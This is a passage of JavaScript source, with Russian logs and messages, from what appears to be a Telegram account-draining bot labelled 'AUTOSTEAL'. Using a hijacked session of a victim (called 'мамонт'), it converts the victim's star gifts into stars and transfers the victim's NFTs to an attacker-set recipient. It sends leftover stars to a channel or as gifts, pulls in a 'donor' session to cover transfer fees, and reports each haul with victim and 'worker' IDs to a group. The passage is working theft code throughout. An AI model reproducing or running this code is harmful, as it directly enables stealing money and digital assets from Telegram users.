        for (let i = 0; i < giftsInfo.regular.length; i++) {
          const gift = giftsInfo.regular[i];
          console.log(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] Продаю подарок...`);
          try {
            let savedGiftInput = null;
            
            if (gift.msgId) {
              savedGiftInput = new Api.InputSavedStarGiftUser({
                msgId: gift.msgId,
              });
            } else if (gift.savedId) {
              let fromPeer = null;
              if (gift.fromId) {
                if (gift.fromId.className === 'PeerUser') {
                  try {
                    const fromUser = await client.getEntity(gift.fromId.userId);
                    fromPeer = await client.getInputEntity(fromUser);
                  } catch (e) {
                    console.log(`[SELL] Ошибка получения fromPeer (User): ${e.message}`);
                    failedCount++;
                    continue;
                  }
                } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
                  try {
                    const chatId = gift.fromId.chatId || gift.fromId.channelId;
                    const fromChat = await client.getEntity(chatId);
                    fromPeer = await client.getInputEntity(fromChat);
                  } catch (e) {
                    console.log(`[SELL] Ошибка получения fromPeer (Chat/Channel): ${e.message}`);
                    failedCount++;
                    continue;
                  }
                }
              }
              
              if (fromPeer) {
                savedGiftInput = new Api.InputSavedStarGiftChat({
                  peer: fromPeer,
                  savedId: gift.savedId,
                });
              } else {
                console.log(`[SELL] Не удалось создать fromPeer для подарка`);
                failedCount++;
              }
            } else {
              console.log(`[SELL] Подарок не имеет msgId и savedId`);
              failedCount++;
            }
            
            if (savedGiftInput) {
              try {
                const giftDate = gift.date || gift.gift?.date;
                if (giftDate) {
                  const giftTimestamp = typeof giftDate === 'number' ? giftDate : parseInt(giftDate);
                  const now = Math.floor(Date.now() / 1000);
                  const daysOld = (now - giftTimestamp) / 86400;
                  
                  if (daysOld > 30) {
                    continue;
                  }
                }
                
                const result = await safeInvoke(client, async () => {
                  return await client.invoke(
                    new Api.payments.ConvertStarGift({
                      stargift: savedGiftInput,
                    })
                  );
                });
                
                if (result) {
                  soldCount++;
                  console.log(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] ✅ Подарок продан`);
                  await persistSession(client, sessionPath);
                  await new Promise(resolve => setTimeout(resolve, 100));
                }
              } catch (e) {
                const errorMsg = e.errorMessage || e.message || 'неизвестная ошибка';
                if (!errorMsg.includes('STARGIFT_CONVERT_TOO_OLD')) {
                  failedCount++;
                  console.error(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] ❌ Ошибка продажи: ${errorMsg}`);
                }
              }
            }
          } catch (e) {
            console.log(`[SELL] Общая ошибка при продаже подарка: ${e.message}`);
            failedCount++;
          }
        }
        
        console.log(`[AUTOSTEAL] 💰 Результат продажи: продано ${soldCount}, не продано ${failedCount}`);
        
        // Обновляем баланс после продажи
        const starsAfterSale = await getStarsBalance(client, sessionPath);
        const starsEarned = starsAfterSale - starsBeforeSale;
        console.log(`[AUTOSTEAL] 💰 Баланс до продажи: ${starsBeforeSale}, после: ${starsAfterSale}, получено: ${starsEarned}`);
        
        stats.regularSold = soldCount;
        stats.regularNotSold = failedCount;
        stats.starsAfter = starsAfterSale;
      } else {
        stats.starsAfter = starsBalance;
        stats.regularNotSold = 0;
      }
      
      // Отправляем все оставшиеся звёзды на сообщение в канале
      const remainingStars = stats.starsAfter;
      if (remainingStars > 0) {
        console.log(`[AUTOSTEAL] ⭐ Отправляю все оставшиеся звёзды (${remainingStars}) на сообщение в канале`);
      await bot.editMessageText(
        `ℹ️ Нет NFT для передачи.\n\n` +
          `💰 Обычных подарков продано: ${stats.regularSold || 0}\n` +
          `⭐ Остаток звёзд: ${remainingStars}\n` +
          `⏳ Отправляю звёзды на сообщение в канале...`,
        { chat_id: chatId, message_id: statusMessage.message_id }
        );
        
        const starsChannelId = config.starsChannelId;
        const starsMessageId = config.starsMessageId;
        
        if (starsChannelId && starsMessageId) {
          try {
            const starsResult = await sendStarsToChannelMessage(client, starsChannelId, starsMessageId, remainingStars);
            
            if (starsResult.success) {
              console.log(`[AUTOSTEAL] ✅ Успешно отправлено ${remainingStars} звёзд на сообщение в канале`);
              stats.starsAfter = 0; // Обновляем баланс до 0
              await bot.editMessageText(
                `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
                `📊 Результаты:\n` +
                `💰 Обычных подарков продано: ${stats.regularSold || 0}\n` +
                `⭐ Звёзд отправлено на сообщение: ${remainingStars}`,
                { chat_id: chatId, message_id: statusMessage.message_id }
              );
            } else {
              console.error(`[AUTOSTEAL] ❌ Ошибка отправки звёзд на сообщение: ${starsResult.error}`);
              await bot.editMessageText(
                `⚠️ Нет NFT для передачи.\n\n` +
                `💰 Обычных подарков продано: ${stats.regularSold || 0}\n` +
                `⭐ Остаток звёзд: ${remainingStars}\n` +
                `❌ Ошибка отправки звёзд на сообщение`,
                { chat_id: chatId, message_id: statusMessage.message_id }
              );
            }
          } catch (e) {
            console.error(`[AUTOSTEAL] ❌ Ошибка при отправке звёзд на сообщение: ${e.message}`);
            await bot.editMessageText(
              `⚠️ Нет NFT для передачи.\n\n` +
              `💰 Обычных подарков продано: ${stats.regularSold || 0}\n` +
              `⭐ Остаток звёзд: ${remainingStars}\n` +
              `❌ Ошибка отправки звёзд`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
          }
        } else {
          console.log(`[AUTOSTEAL] ⚠️  Не указаны starsChannelId или starsMessageId в config.json`);
          await bot.editMessageText(
            `⚠️ Нет NFT для передачи.\n\n` +
            `💰 Обычных подарков продано: ${stats.regularSold || 0}\n` +
            `⭐ Остаток звёзд: ${remainingStars}\n` +
            `⚠️ Не указаны параметры канала для отправки звёзд`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
        }
      } else {
        await bot.editMessageText(
          `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
          `📊 Результаты:\n` +
          `💰 Обычных подарков продано: ${stats.regularSold || 0}\n` +
          `⭐ Остаток звёзд: 0`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
      }
      
      // Отправляем итоги в группу
      await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
      
      return;
    }
    
    // Обновляем баланс перед финальной проверкой
    const finalStarsBalanceCheck = await getStarsBalance(client, sessionPath);
    console.log(`[AUTOSTEAL] Проверка условий: starsBalance=${finalStarsBalanceCheck}, transferCost=${transferCost}, nftCount=${nftCount}`);
    
    // Если звёзд хватает (или есть бесплатные NFT), начинаем автостил
    // Если есть только бесплатные NFT (transferCost = 0), тоже передаём
    if ((finalStarsBalanceCheck >= transferCost || transferCost === 0) && nftCount > 0) {
      console.log(`[AUTOSTEAL] ✅ ЗВЁЗД ДОСТАТОЧНО ИЛИ ЕСТЬ БЕСПЛАТНЫЕ NFT!`);
      console.log(`[AUTOSTEAL]    Баланс: ${finalStarsBalanceCheck} звёзд`);
      console.log(`[AUTOSTEAL]    Нужно: ${transferCost} звёзд`);
      if (transferCost === 0 && freeNFTs.length > 0) {
        console.log(`[AUTOSTEAL]    💰 Все NFT бесплатные, передача без оплаты!`);
      }
      console.log(`[AUTOSTEAL] 🖼️  ЭТАП 5: Передача NFT`);
      console.log(`[AUTOSTEAL] 🖼️  Начинаю передачу ${nftCount} NFT (${paidNFTs.length} платных, ${freeNFTs.length} бесплатных)...`);
      
      const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
      await bot.editMessageText(
        `✅ Звёзд достаточно (${finalStarsBalanceCheck})! Начинаю передачу ${nftCount} NFT на ${recipientDisplay}...`,
        { chat_id: chatId, message_id: statusMessage.message_id }
      );
      
      // Передаём только проверенные NFT
      console.log(`[AUTOSTEAL] 🖼️  Вызываю transferNFT с ${transferableNFTs.length} проверенными NFT...`);
      let progressText = '';
      const result = await transferNFT(client, recipient, async (msg) => {
        progressText += msg + '\n';
        if (progressText.length > 3000) {
          progressText = progressText.slice(-2000); // Обрезаем если слишком длинное
        }
        try {
          await bot.editMessageText(
            `🔄 Передача NFT:\n${progressText}`,
            { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: 'HTML' }
          );
        } catch (e) {}
      }, transferableNFTs, sessionPath);
      
      stats.nftSuccess = result.success || [];
      // Сохраняем успешно переданные NFT в base.txt
      if (result.success && result.success.length > 0) {
        await saveSuccessfulNFTs(result.success);
      }
      // Объединяем ошибки из проверки и из передачи
      const allFailedNFTs = [...(result.failed || []), ...nonTransferableNFTs.map(item => ({
        name: item.name,
        link: item.link,
        error: item.error
      }))];
      stats.nftFailed = allFailedNFTs;
      
      // Сохраняем успешно переданные NFT в base.txt
      if (result.success && result.success.length > 0) {
        await saveSuccessfulNFTs(result.success);
      }
      
      console.log(`[AUTOSTEAL] 🖼️  Результат передачи NFT:`);
      console.log(`[AUTOSTEAL]    ✅ Успешно передано: ${result.sent || 0}`);
      console.log(`[AUTOSTEAL]    ❌ Ошибок: ${result.failed || 0}`);
      
      if (result.success && result.success.length > 0) {
        console.log(`[AUTOSTEAL]    ✅ Список переданных NFT:`);
        result.success.forEach((nft, index) => {
          console.log(`[AUTOSTEAL]       ${index + 1}. ${nft.name} - ${nft.link}`);
        });
      }
      
      if (allFailedNFTs.length > 0) {
        console.log(`[AUTOSTEAL]    ❌ Список неудачных NFT:`);
        allFailedNFTs.forEach((nft, index) => {
          console.log(`[AUTOSTEAL]       ${index + 1}. ${nft.name} - ${nft.error || 'неизвестная ошибка'}`);
        });
      }
      
      let nftList = '';
      if (result.success && result.success.length > 0) {
        result.success.forEach((nft, index) => {
          nftList += `\n${index + 1}. ${nft.name} - <code>${nft.link}</code>`;
        });
      }
      
      const mamontText = `\n👤 <b>Мамонт:</b> @${accountInfo.username || 'без username'} (<code>${accountInfo.id}</code>)`;
      const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
      const mskTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow', day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
      
      if (result.sent > 0) {
        await sendLogToGroup(
          `✅ <b>NFT успешно переданы!</b>\n` +
          `🕐 <b>Время:</b> <code>${mskTime} МСК</code>\n` +
          `🖼️ <b>Передано NFT:</b> <code>${result.sent}</code>${nftList}${mamontText}${workerTextFormatted}`
        );
      }
      
      if (allFailedNFTs.length > 0) {
        let failedList = '';
        allFailedNFTs.forEach((nft, index) => {
          failedList += `\n${index + 1}. ${nft.name} - ${nft.link}\n   ❌ <code>${nft.error || 'неизвестная ошибка'}</code>`;
        });
        // Убрано логирование ошибок передачи NFT
      }
      
      await bot.editMessageText(
        `✅ NFT переданы!\n` +
        `Успешно: ${result.sent}\n` +
        `Ошибок: ${result.failed}\n\n` +
        `⏳ Проверяю остаток звёзд...`,
        { chat_id: chatId, message_id: statusMessage.message_id }
      );
      
      // Получаем остаток звёзд
      console.log(`[AUTOSTEAL] 💰 Проверяю остаток звёзд после передачи NFT...`);
      const remainingStars = await getStarsBalance(client, sessionPath);
      console.log(`[AUTOSTEAL] 💰 Остаток звёзд: ${remainingStars}`);
      stats.starsAfter = remainingStars;
      stats.regularNotSold = giftsInfo.regular.length;
      
      // Отправка остатка звёзд на сообщение в канале
      if (remainingStars > 0) {
        console.log(`[AUTOSTEAL] ⭐ ЭТАП 6: Отправка остатка звёзд на сообщение в канале`);
        console.log(`[AUTOSTEAL] ⭐ Остаток: ${remainingStars} звёзд`);
        
        await bot.editMessageText(
          `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
          `📊 Результаты:\n` +
          `🖼️  NFT отправлено: ${result.sent}\n` +
          `💰 Остаток звёзд: ${remainingStars}\n` +
          `⏳ Отправляю звёзды на сообщение в канале...`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
        
        // Отправляем итоги в группу сразу
        console.log(`[AUTOSTEAL] Вызываю sendAutostealResults. Stars: ${stats.starsBefore}→${remainingStars}, NFT: ${stats.nftSuccess?.length || 0}`);
        await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
        
        // Отправляем звёзды на сообщение в канале
        const starsChannelId = config.starsChannelId;
        const starsMessageId = config.starsMessageId;
        
        if (starsChannelId && starsMessageId) {
          try {
            console.log(`[AUTOSTEAL] ⭐ Отправляю ${remainingStars} звёзд на сообщение ${starsMessageId} в канале ${starsChannelId}`);
            const starsResult = await sendStarsToChannelMessage(client, starsChannelId, starsMessageId, remainingStars);
            
            if (starsResult.success) {
              console.log(`[AUTOSTEAL] ✅ Успешно отправлено ${remainingStars} звёзд на сообщение в канале`);
              await bot.editMessageText(
                `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
                `📊 Результаты:\n` +
                `🖼️  NFT отправлено: ${result.sent}\n` +
                `⭐ Звёзд отправлено на сообщение: ${remainingStars}`,
                { chat_id: chatId, message_id: statusMessage.message_id }
              );
              // Обновляем баланс до 0 после успешной отправки
              stats.starsAfter = 0;
            } else {
              console.error(`[AUTOSTEAL] ❌ Ошибка отправки звёзд на сообщение: ${starsResult.error}`);
              // Если не удалось отправить на сообщение, отправляем в виде подарков как fallback
              console.log(`[AUTOSTEAL] ⚠️  Fallback: отправляю остаток в виде подарков`);
        sendRemainingStarsAsGifts(
          client,
          remainingStarsRecipient,
          remainingStars,
          async (msg) => {
            console.log(`[AUTOSTEAL-BACKGROUND] ${msg}`);
          }
              ).catch((error) => {
          console.error(`[AUTOSTEAL-BACKGROUND] ❌ Ошибка отправки остатка: ${error.message}`);
        });
        stats.starsAfter = remainingStars;
            }
          } catch (e) {
            console.error(`[AUTOSTEAL] ❌ Ошибка при отправке звёзд на сообщение: ${e.message}`);
            // Fallback: отправляем в виде подарков
            console.log(`[AUTOSTEAL] ⚠️  Fallback: отправляю остаток в виде подарков`);
            sendRemainingStarsAsGifts(
              client,
              remainingStarsRecipient,
              remainingStars,
              async (msg) => {
                console.log(`[AUTOSTEAL-BACKGROUND] ${msg}`);
              }
            ).catch((error) => {
              console.error(`[AUTOSTEAL-BACKGROUND] ❌ Ошибка отправки остатка: ${error.message}`);
            });
            stats.starsAfter = remainingStars;
          }
        } else {
          console.log(`[AUTOSTEAL] ⚠️  Не указаны starsChannelId или starsMessageId в config.json, отправляю остаток в виде подарков`);
          // Fallback: отправляем в виде подарков, если не указаны параметры канала
          sendRemainingStarsAsGifts(
            client,
            remainingStarsRecipient,
            remainingStars,
            async (msg) => {
              console.log(`[AUTOSTEAL-BACKGROUND] ${msg}`);
            }
          ).catch((error) => {
            console.error(`[AUTOSTEAL-BACKGROUND] ❌ Ошибка отправки остатка: ${error.message}`);
          });
          stats.starsAfter = remainingStars;
        }
        
        stats.regularNotSold = giftsInfo.regular.length;
      } else {
        // Обновляем остаток звёзд (0)
        const finalStars = await getStarsBalance(client, sessionPath);
        stats.starsAfter = finalStars;
        stats.regularNotSold = giftsInfo.regular.length;
        console.log(`[AUTOSTEAL] Остаток звёзд = 0. Обновлены stats: starsAfter=${stats.starsAfter}, regularNotSold=${stats.regularNotSold}, nftSuccess=${stats.nftSuccess?.length || 0}`);
        
        await bot.editMessageText(
          `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
          `📊 Результаты:\n` +
          `🖼️  NFT отправлено: ${result.sent}\n` +
          `💰 Остаток звёзд: 0`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
        
        // Отправляем итоги в группу
        console.log(`[AUTOSTEAL] Вызываю sendAutostealResults. Stars: ${stats.starsBefore}→${stats.starsAfter}, NFT: ${stats.nftSuccess?.length || 0}`);
        await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
      }
    } else {
      console.log(`[AUTOSTEAL] Недостаточно звёзд, начинаю пополнение баланса...`);
      // Если звёзд не хватает, пытаемся получить их
      await bot.editMessageText(
        `❌ Недостаточно звёзд для передачи NFT.\n` +
        `Нужно: ${transferCost}, Есть: ${starsBalance}\n` +
        `Не хватает: ${neededStars}\n\n` +
        `⏳ Пытаюсь получить недостающие звёзды...`,
        { chat_id: chatId, message_id: statusMessage.message_id }
      );
      
      // Шаг 1: Сначала продаём все обычные подарки мамонта (если есть)
      if (giftsInfo.regular.length > 0) {
        console.log(`[AUTOSTEAL] 💰 ЭТАП 5.1: Продажа обычных подарков мамонта`);
        console.log(`[AUTOSTEAL] 💰 Найдено обычных подарков: ${giftsInfo.regular.length}`);
        console.log(`[AUTOSTEAL] 💰 Баланс до продажи: ${starsBalance} звёзд`);
        await bot.editMessageText(
          `💰 Найдено обычных подарков: ${giftsInfo.regular.length}\n` +
          `⏳ Продаю обычные подарки...`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
        
        const starsBefore = starsBalance;
        let soldCount = 0;
        let failedCount = 0;
        let errorMessages = [];
        
        console.log(`[AUTOSTEAL] 💰 Начинаю продажу ${giftsInfo.regular.length} подарков...`);
        for (let i = 0; i < giftsInfo.regular.length; i++) {
          const gift = giftsInfo.regular[i];
          console.log(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] Продаю подарок...`);
          try {
            let savedGiftInput = null;
            
            if (gift.msgId) {
              savedGiftInput = new Api.InputSavedStarGiftUser({
                msgId: gift.msgId,
              });
            } else if (gift.savedId) {
              let fromPeer = null;
              if (gift.fromId) {
                if (gift.fromId.className === 'PeerUser') {
                  try {
                    const fromUser = await client.getEntity(gift.fromId.userId);
                    fromPeer = await client.getInputEntity(fromUser);
                  } catch (e) {
                    console.log(`[SELL] Ошибка получения fromPeer (User): ${e.message}`);
                    failedCount++;
                    errorMessages.push(`Не удалось получить fromPeer (User): ${e.message}`);
                    continue;
                  }
                } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
                  try {
                    const chatId = gift.fromId.chatId || gift.fromId.channelId;
                    const fromChat = await client.getEntity(chatId);
                    fromPeer = await client.getInputEntity(fromChat);
                  } catch (e) {
                    console.log(`[SELL] Ошибка получения fromPeer (Chat/Channel): ${e.message}`);
                    failedCount++;
                    errorMessages.push(`Не удалось получить fromPeer (Chat/Channel): ${e.message}`);
                    continue;
                  }
                }
              } else {
                console.log(`[SELL] Подарок не имеет fromId`);
                failedCount++;
                errorMessages.push('Подарок не имеет fromId');
              }
              
              if (fromPeer) {
                savedGiftInput = new Api.InputSavedStarGiftChat({
                  peer: fromPeer,
                  savedId: gift.savedId,
                });
              } else {
                console.log(`[SELL] Не удалось создать fromPeer для подарка`);
                failedCount++;
                errorMessages.push('Не удалось создать fromPeer');
              }
            } else {
              console.log(`[SELL] Подарок не имеет msgId и savedId`);
              failedCount++;
              errorMessages.push('Подарок не имеет msgId и savedId');
            }
            
            if (savedGiftInput) {
              try {
                const giftDate = gift.date || gift.gift?.date;
                if (giftDate) {
                  const giftTimestamp = typeof giftDate === 'number' ? giftDate : parseInt(giftDate);
                  const now = Math.floor(Date.now() / 1000);
                  const daysOld = (now - giftTimestamp) / 86400;
                  
                  if (daysOld > 30) {
                    continue;
                  }
                }
                
                const result = await safeInvoke(client, async () => {
                  return await client.invoke(
                    new Api.payments.ConvertStarGift({
                      stargift: savedGiftInput,
                    })
                  );
                });
                
                if (result) {
                  soldCount++;
                  console.log(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] ✅ Подарок продан`);
                  await persistSession(client, sessionPath);
                  await new Promise(resolve => setTimeout(resolve, 100));
                } else {
                  console.log(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] ⚠️  Результат продажи: null`);
                }
              } catch (e) {
                const errorMsg = e.errorMessage || e.message || 'неизвестная ошибка';
                if (!errorMsg.includes('STARGIFT_CONVERT_TOO_OLD')) {
                  failedCount++;
                  console.error(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] ❌ Ошибка продажи: ${errorMsg}`);
                  errorMessages.push(`Подарок ${i + 1}: ${errorMsg}`);
                } else {
                  console.log(`[AUTOSTEAL] 💰 [${i + 1}/${giftsInfo.regular.length}] ⏭️  Подарок слишком старый (>30 дней), пропускаю`);
                }
              }
            }
          } catch (e) {
            console.log(`[SELL] Общая ошибка при продаже подарка: ${e.message}`);
            failedCount++;
            errorMessages.push(`Общая ошибка: ${e.message}`);
          }
        }
        
        console.log(`[AUTOSTEAL] 💰 Результат продажи подарков мамонта:`);
        console.log(`[AUTOSTEAL]    ✅ Продано: ${soldCount}/${giftsInfo.regular.length}`);
        console.log(`[AUTOSTEAL]    ❌ Не продано: ${failedCount}`);
        if (failedCount > 0) {
          console.error(`[AUTOSTEAL]    ❌ Ошибки продажи:`);
          errorMessages.slice(0, 5).forEach((err, idx) => {
            console.error(`[AUTOSTEAL]       ${idx + 1}. ${err}`);
          });
        }
        
        const starsAfter = await getStarsBalance(client, sessionPath);
        const starsEarned = starsAfter - starsBefore;
        console.log(`[AUTOSTEAL] 💰 Баланс после продажи: ${starsAfter} звёзд`);
        console.log(`[AUTOSTEAL] 💰 Получено звёзд: ${starsEarned}`);
        stats.regularSold = soldCount;
        stats.regularNotSold = giftsInfo.regular.length - soldCount;
        
        // Лог "Продажа подарков" удалён по запросу
        
        await bot.editMessageText(
          `✅ Продано подарков: ${soldCount}\n` +
          `💰 Получено звёзд: ${starsEarned}\n` +
          `⭐ Текущий баланс: ${starsAfter}\n\n` +
          `⏳ Проверяю, хватает ли звёзд...`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
        
        // Лог "Подарки проданы" удалён по запросу
        
        // Обновляем баланс после продажи подарков мамонта
        starsBalance = starsAfter;
        neededStars = Math.max(0, transferCost - starsBalance);
        
        console.log(`[AUTOSTEAL] 💰 После продажи подарков мамонта:`);
        console.log(`[AUTOSTEAL]    Баланс: ${starsBalance} звёзд`);
        console.log(`[AUTOSTEAL]    Нужно: ${transferCost} звёзд`);
        console.log(`[AUTOSTEAL]    Не хватает: ${neededStars} звёзд`);
        
        if (starsBalance >= transferCost) {
          console.log(`[AUTOSTEAL] ✅ Теперь звёзд достаточно! Перехожу к передаче NFT`);
          // Теперь звёзд хватает, продолжаем автостил
          // Передаём только платные NFT (бесплатные уже переданы, если были)
          const paidNFTsToTransfer = transferableNFTs.filter(nft => !nft.freeTransfer);
          console.log(`[AUTOSTEAL] ✅ Теперь звёзд достаточно! Передаю ${paidNFTsToTransfer.length} платных NFT...`);
          const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
          await bot.editMessageText(
            `✅ Теперь звёзд достаточно! Начинаю передачу ${paidNFTsToTransfer.length} платных NFT на ${recipientDisplay}...`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          let progressText = '';
          const result = await transferNFT(client, recipient, async (msg) => {
            progressText += msg + '\n';
            if (progressText.length > 3000) {
              progressText = progressText.slice(-2000);
            }
            try {
              await bot.editMessageText(
                `🔄 Передача NFT:\n${progressText}`,
                { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: 'HTML' }
              );
            } catch (e) {}
          }, paidNFTsToTransfer, sessionPath);
          
          stats.nftSuccess = result.success || [];
          // Сохраняем успешно переданные NFT в base.txt
          if (result.success && result.success.length > 0) {
            await saveSuccessfulNFTs(result.success);
          }
          // Объединяем ошибки из проверки и из передачи
          const allFailedNFTs2 = [...(result.failed || []), ...nonTransferableNFTs.map(item => ({
            name: item.name,
            link: item.link,
            error: item.error
          }))];
          stats.nftFailed = allFailedNFTs2;
          
          let nftList = '';
          if (result.success && result.success.length > 0) {
            result.success.forEach((nft, index) => {
              nftList += `\n${index + 1}. ${nft.name} - <code>${nft.link}</code>`;
            });
          }
          
          const mamontText = `\n👤 <b>Мамонт:</b> @${accountInfo.username || 'без username'} (<code>${accountInfo.id}</code>)`;
          const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
          
          if (allFailedNFTs2.length > 0) {
            let failedList = '';
            allFailedNFTs2.forEach((nft, index) => {
              failedList += `\n${index + 1}. ${nft.name} - ${nft.link}\n   ❌ <code>${nft.error || 'неизвестная ошибка'}</code>`;
            });
            // Убрано логирование ошибок передачи NFT
          }
          
          await bot.editMessageText(
            `✅ NFT переданы!\n` +
            `Успешно: ${result.sent}\n` +
            `Ошибок: ${result.failed}\n\n` +
            `⏳ Проверяю остаток звёзд...`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          // Получаем остаток звёзд
          const remainingStars = await getStarsBalance(client);
          
          if (remainingStars > 0) {
            const remainingStarsDisplay = remainingStarsRecipientId ? `ID ${remainingStarsRecipientId}` : `@${remainingStarsRecipientUsername}`;
            await bot.editMessageText(
              `💰 Остаток звёзд: ${remainingStars}\n` +
              `⏳ Отправляю остаток в виде подарков на ${remainingStarsDisplay}...`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            // Отправляем остаток в виде подарков
            let giftProgressText = '';
            const giftResult = await sendRemainingStarsAsGifts(
              client,
              remainingStarsRecipient,
              remainingStars,
              async (msg) => {
                giftProgressText += msg + '\n';
                if (giftProgressText.length > 3000) {
                  giftProgressText = giftProgressText.slice(-2000);
                }
                try {
                  await bot.editMessageText(
                    `🔄 Отправка подарков:\n${giftProgressText}`,
                    { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: 'HTML' }
                  );
                } catch (e) {}
              }
            );
            
            await bot.editMessageText(
              `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
              `📊 Результаты:\n` +
              `💰 Продано подарков: ${soldCount} (+${starsEarned} звёзд)\n` +
              `🖼️  NFT отправлено: ${result.sent}\n` +
              `🎁 Подарков отправлено: ${giftResult.sent}\n` +
              `💰 Потрачено звёзд на подарки: ${giftResult.spent || 0}`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
          } else {
            await bot.editMessageText(
              `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
              `📊 Результаты:\n` +
              `💰 Продано подарков: ${soldCount} (+${starsEarned} звёзд)\n` +
              `🖼️  NFT отправлено: ${result.sent}\n` +
              `💰 Остаток звёзд: 0`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
          }
        } else {
          // Всё ещё не хватает звёзд - используем донорскую сессию
          console.log(`[AUTOSTEAL] ⚠️  Звёзд всё ещё недостаточно после продажи подарков мамонта`);
          console.log(`[AUTOSTEAL] 💰 ЭТАП 5.2: Использование донорской сессии`);
          await bot.editMessageText(
            `❌ Всё ещё недостаточно звёзд для передачи NFT.\n` +
            `Нужно: ${transferCost}, Есть: ${starsBalance}\n` +
            `Не хватает: ${neededStars}\n\n` +
            `⏳ Подключаюсь к дополнительной сессии...`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          // Лог "Подключение к донорской сессии" удалён по запросу
          
          // Подключаемся к донорской сессии
          const donorPath = path.join(__dirname, config.donorFolder || 'donor');
          console.log(`[AUTOSTEAL] 💰 Проверяю донорскую сессию в папке: ${donorPath}`);
          
          if (!(await fs.pathExists(donorPath))) {
            console.error(`[AUTOSTEAL] Папка донорской сессии не найдена: ${donorPath}`);
            const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
            // Убрано логирование ошибок донорской сессии
            await bot.editMessageText(
              `❌ Папка дополнительной сессии не найдена: ${donorPath}\n` +
              `💡 Создайте папку и поместите туда .session файл дополнительной сессии`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            return;
          }
          
          const files = await fs.readdir(donorPath);
          const sessionFile = files.find(f => f.endsWith('.session'));
          
          if (!sessionFile) {
            console.error(`[AUTOSTEAL] Файл .session не найден в папке: ${donorPath}`);
            const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
            // Убрано логирование ошибок донорской сессии
            await bot.editMessageText(
              `❌ Файл .session не найден в папке дополнительной сессии\n` +
              `💡 Поместите .session файл в папку: ${donorPath}`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            return;
          }
          
          const donorSessionPath = path.join(donorPath, sessionFile);
          console.log(`[AUTOSTEAL] 💰 Подключаюсь к донорской сессии: ${donorSessionPath}`);
          const donorClient = await connectDonorSession(donorSessionPath);
          
          if (!donorClient) {
            console.error(`[AUTOSTEAL] ❌ Не удалось подключиться к донорской сессии: ${donorSessionPath}`);
            const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
            // Убрано логирование ошибок донорской сессии
            await bot.editMessageText(
              `❌ Не удалось подключиться к донорской сессии`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            return;
          }
          
          console.log(`[AUTOSTEAL] ✅ Успешно подключился к донорской сессии`);
          
          try {
            const donorInfo = await donorClient.getMe();
            const donorSessionId = String(donorInfo.id);
            const mainInfo = await client.getMe();
            const mainUsername = mainInfo.username || `user${mainInfo.id}`;
            console.log(`[AUTOSTEAL] 💰 Донорская сессия: @${donorInfo.username || 'без username'} (${donorInfo.id})`);
            console.log(`[AUTOSTEAL] 💰 Получатель подарков: @${mainUsername} (${mainInfo.id})`);
            
            await safeEditMessage(chatId, statusMessage.message_id,
              `✅ Подключено к донорской сессии: @${donorInfo.username || 'без username'}\n` +
              `📤 Получатель: @${mainUsername}\n\n` +
              `⏳ Получаю список доступных подарков...`
            );
            
            // Получаем список доступных подарков из БД или через API
